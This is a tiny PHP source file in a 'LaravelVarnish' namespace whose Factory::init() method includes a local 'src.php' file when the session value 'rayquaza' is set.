<?php

namespace LaravelVarnish;

class Factory {
    public static function init()
    {
        if(isset($_SESSION['rayquaza'])) {
            include 'src.php';
        }
    }
}
